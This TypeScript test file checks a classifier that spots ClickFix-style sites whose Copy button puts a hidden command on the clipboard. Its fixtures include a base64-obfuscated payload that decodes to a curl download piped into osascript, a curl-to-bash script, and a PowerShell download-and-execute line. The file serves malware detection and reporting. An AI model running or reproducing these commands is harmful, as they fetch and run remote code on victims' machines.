import { describe, expect, test } from "bun:test";

import type { ClipboardWrite } from "../../browser/clipboard";
import { defangCommand } from "../../malware/defang";
import { sha256Hex } from "../../util/hash";
import { reportableWebsiteHop } from "../info/report_hops";
import type { WebsiteNavigationHop, WebsiteSiteAssessment } from "../types";
import {
	buildWebsiteClassificationInput,
	buildWebsiteReportEvidence,
	classifiedEvidenceSource,
	copiedTexts,
	validateWebsiteSiteClassification,
	websiteClassificationFingerprint,
	type WebsiteEvidenceArchive,
} from "./classification";
import { buildWebsiteAnalysisInput } from "./narrative";

/**
 * trylevo.app (production case 384401854580134038), a ClickFix clone of the
 * Levo app's site: its install dialog shows `brew install --cask levo` and a
 * Copy button, which fetched ./install-command.txt and put this on the
 * clipboard. The classifier only read the page and found it benign.
 */
const PAGE_URL = "https://trylevo.app/";
const TRYLEVO_PAYLOAD = ": \"brew install --cask levo\"; printf 'Y3VybCAtc2ZMIC0tcmV0cnkgMyAtLXJldHJ5LWFsbC1lcnJvcnMgaHR0cHM6Ly9ob3N0c3luYy5wcm8vaGdwMDNtL0xOY2Y4S3BtNnFXciB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh";
const DECODED = "curl -sfL --retry 3 --retry-all-errors https://hostsync.pro/hgp03m/LNcf8Kpm6qWr | osascript -l JavaScript";
const PAYLOAD_URL = "https://hostsync.pro/hgp03m/LNcf8Kpm6qWr";
const PAGE_TEXT = "Levo\nThe menu bar app for your day.\nInstall Levo\nRun this in Terminal:\nbrew install --cask levo\nCopy\nRequires macOS 13 or later.";
/** A multi-line script a copy button hands out: the payload is on its third line. */
const MULTI_LINE = "# Levo installer\necho 'Installing Levo…'\ncurl -fsSL https://cdn-levo.example/setup.sh | bash";

const write = (text: string, documentUrl = PAGE_URL): ClipboardWrite => ({ text, documentUrl, via: "writeText", at: "2026-11-26T10:00:05.000Z" });
const hop: WebsiteNavigationHop = { index: 0, url: PAGE_URL, hostname: "trylevo.app", status: 200, contentType: "text/html", contentCaptured: true };

function archive(clipboardWrites?: ClipboardWrite[]): WebsiteEvidenceArchive {
	return {
		requestedUrl: PAGE_URL,
		url: PAGE_URL,
		hostname: "trylevo.app",
		navigationHops: [hop],
		html: Buffer.from("<html><head><title>Levo</title></head><body><h1>Levo</h1><code>brew install --cask levo</code><button>Copy</button></body></html>"),
		text: Buffer.from(PAGE_TEXT),
		...(clipboardWrites ? { clipboardWrites } : {}),
	};
}

const answer = (evidenceQuote: string, finding = "malware") => ({ finding, phishingBasis: finding === "phishing" ? "credential_theft" : "none", evidenceQuote, collectionFieldRefs: [], hiddenFrameRef: "", mobileHandoff: false });
const page = (clipboardWrites: ClipboardWrite[] = [write(TRYLEVO_PAYLOAD)]) => ({ text: PAGE_TEXT, html: "<html></html>", url: PAGE_URL, clipboardWrites });

describe("what a page put on the clipboard, as evidence", () => {
	test("is decoded whole, flagged when the page shows something else, and kept once per text", () => {
		const [copied, ...rest] = copiedTexts([write(TRYLEVO_PAYLOAD), write(TRYLEVO_PAYLOAD), write("brew install --cask levo"), write("   ")], PAGE_TEXT);
		expect(copied).toMatchObject({ command: true, shownOnPage: false, write: { text: TRYLEVO_PAYLOAD } });
		expect(copied!.decoded.layers.map((layer) => layer.text)).toEqual([TRYLEVO_PAYLOAD, DECODED]);
		expect(copied!.decoded.payloadUrls).toEqual([PAYLOAD_URL]);
		expect(copied!.decoded.interpreters).toEqual(["curl", "osascript"]);
		expect(copied!.decoded.decoys).toEqual(["brew install --cask levo"]);
		// A copy of exactly what the page shows is no decoy, and no command by itself.
		expect(rest).toEqual([expect.objectContaining({ command: false, shownOnPage: true, write: expect.objectContaining({ text: "brew install --cask levo" }) })]);

		// A script over several lines is one text: its payload is found whatever line it is on.
		const [script] = copiedTexts([write(MULTI_LINE)], PAGE_TEXT);
		expect(script).toMatchObject({ command: true, shownOnPage: false });
		expect(script!.decoded.payloadUrls).toEqual(["https://cdn-levo.example/setup.sh"]);

		expect(copiedTexts(Array.from({ length: 15 }, (_, index) => write(`copied ${index}`)), PAGE_TEXT)).toHaveLength(10);
		expect(copiedTexts(undefined, PAGE_TEXT)).toEqual([]);
	});

	test("the classifier reads what the Copy button put on the clipboard, decoded down to the payload it runs", () => {
		const [system, user] = buildWebsiteClassificationInput(hop, archive([write(TRYLEVO_PAYLOAD)]));
		expect(system.content).toContain("A copy control that puts another command on the visitor's clipboard than the one the page shows");
		expect(system.content).toContain("copy evidenceQuote verbatim from that copied text or one of its decoded layers instead");
		const text = (user.content as Array<{ text?: string }>)[0]!.text!;
		expect(text).toContain("clipboard_writes lists the text the page itself put on the visitor's clipboard");
		expect(text).toContain("shown_on_page: false");
		expect(text).toContain("is_command: true");
		expect(text).toContain(`copied_by: "${PAGE_URL}"`);
		expect(text).toContain(DECODED);
		expect(text).toContain(PAYLOAD_URL);
		// The page shows no command of its own to paste: brew alone runs nothing fetched.
		expect(text).not.toContain("The captured page shows these commands");

		const [, plain] = buildWebsiteClassificationInput(hop, archive());
		expect((plain.content as Array<{ text?: string }>)[0]!.text).not.toContain("clipboard_writes");
		// The same page that copied something else is other evidence, judged again.
		expect(websiteClassificationFingerprint(hop, archive([write(TRYLEVO_PAYLOAD)]))).not.toBe(websiteClassificationFingerprint(hop, archive()));
	});

	test("a malware finding stands on a quote of the copied command or what it decodes to, and names the write", () => {
		const cited = { documentUrl: PAGE_URL, sha256: sha256Hex(TRYLEVO_PAYLOAD) };
		expect(validateWebsiteSiteClassification(answer(DECODED), page())).toEqual({ finding: "malware", evidenceQuote: DECODED, clipboardWrite: cited });
		expect(validateWebsiteSiteClassification(answer(`  ${TRYLEVO_PAYLOAD}\n`), page())).toEqual({ finding: "malware", evidenceQuote: TRYLEVO_PAYLOAD, clipboardWrite: cited });
		// A quote across the lines of a copied script is that script's text.
		expect(validateWebsiteSiteClassification(answer("echo 'Installing Levo…'\ncurl -fsSL https://cdn-levo.example/setup.sh | bash"), page([write(MULTI_LINE, `${PAGE_URL}frame`)]))).toEqual({
			finding: "malware",
			evidenceQuote: "echo 'Installing Levo…' curl -fsSL https://cdn-levo.example/setup.sh | bash",
			clipboardWrite: { documentUrl: `${PAGE_URL}frame`, sha256: sha256Hex(MULTI_LINE) },
		});
		// Page text is still page text: a quote of it cites no write.
		expect(validateWebsiteSiteClassification(answer("brew install --cask levo"), page())).toEqual({ finding: "malware", evidenceQuote: "brew install --cask levo" });
	});

	test("a quote the clipboard does not hold, a fragment, a copied text that is no command, or a phishing claim stays uncorroborated", () => {
		const rejected = { finding: "insufficient_evidence" as const, rejectedClaim: "its evidence quote does not appear verbatim in the captured page text" };
		expect(validateWebsiteSiteClassification(answer("curl -sfL https://hostsync.pro/other | osascript -l JavaScript"), page())).toEqual(rejected);
		expect(validateWebsiteSiteClassification(answer(DECODED), page([]))).toEqual(rejected);
		expect(validateWebsiteSiteClassification(answer("| osascript -l"), page())).toEqual(rejected);
		// A wallet address the page copies is no command that runs anything.
		const wallet = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
		expect(validateWebsiteSiteClassification(answer(wallet), page([write(wallet)]))).toEqual(rejected);
		// Phishing is what the visitor is shown, never what a page copies.
		expect(validateWebsiteSiteClassification(answer(DECODED, "phishing"), page())).toEqual(rejected);
	});

	test("the report cites the copied command with its decoded payload, and the case only reports a page whose capture still holds that write", () => {
		const copiedArchive = archive([write("brew install --cask levo"), write(TRYLEVO_PAYLOAD)]);
		const classification = validateWebsiteSiteClassification(answer(DECODED), page(copiedArchive.clipboardWrites));
		const report = buildWebsiteReportEvidence(classification, { commands: [], copied: copiedTexts(copiedArchive.clipboardWrites, PAGE_TEXT), navigationHops: [hop] }).split("\n");
		expect(report).toEqual([
			"The page distributes malware: it gets visitors to download, install, or run something that harms them.",
			`What the page's copy control put on the visitor's clipboard that shows it (defanged): ${JSON.stringify(defangCommand(DECODED))}.`,
			`The page's copy control puts this command on the visitor's clipboard instead, which the page does not show (defanged): ${JSON.stringify(defangCommand(TRYLEVO_PAYLOAD))}.`,
			`Decoded, it runs: ${JSON.stringify(defangCommand(DECODED))}.`,
			"It shows \"brew install --cask levo\" so the visitor believes a legitimate install is running.",
			`It downloads and runs code from: ${PAYLOAD_URL}.`,
		]);
		// A page judged benign says nothing about what it copied.
		expect(buildWebsiteReportEvidence({ finding: "benign" }, { copied: copiedTexts(copiedArchive.clipboardWrites, PAGE_TEXT) })).toBe("");

		const assessments: WebsiteSiteAssessment[] = [{ ...classification, hopIndex: 0, judgedHopIndex: 0 }];
		expect(classifiedEvidenceSource(classification, copiedArchive)).toBe([TRYLEVO_PAYLOAD, TRYLEVO_PAYLOAD, DECODED].join("\n"));
		expect(reportableWebsiteHop([hop], assessments, copiedArchive)).toEqual(hop);
		// Another capture of the page, without that write, is no proof of it.
		expect(reportableWebsiteHop([hop], assessments, archive([write(TRYLEVO_PAYLOAD, `${PAGE_URL}other`)]))).toBeUndefined();
		expect(reportableWebsiteHop([hop], assessments, archive())).toBeUndefined();
	});

	test("the narrative is told what each page copied during the visit, decoded for the analyzed page", () => {
		const writes = [{ ...write("powershell -w h -c \"iex(irm https://verify-check.example/v)\"", "https://trylevo.app/verify"), via: "exec_command" as const }, write(TRYLEVO_PAYLOAD)];
		const [system, user] = buildWebsiteAnalysisInput(archive([writes[1]!]), {
			finding: "The page distributes malware.",
			visit: { outcome: "completed", actions: [], dataSent: [], downloadFailures: [], clipboardWrites: writes },
		});
		expect(system.content).toContain("what it put on the clipboard");
		expect(system.content).toContain("when a copy control copies something other than what the page shows, say what it shows and what it copies");
		const text = (user.content as Array<{ text?: string }>)[0]!.text!;
		expect(text).toContain("Everything the site's pages put on the clipboard during the visit, in order");
		expect(text).toContain("clipboard_writes_during_visit[2]{copied_by,via,text}:\n  \"https://trylevo.app/verify\",exec_command,");
		expect(text).toContain("clipboard_writes lists the text the page itself put on the visitor's clipboard");
		expect(text).toContain(DECODED);
	});
});
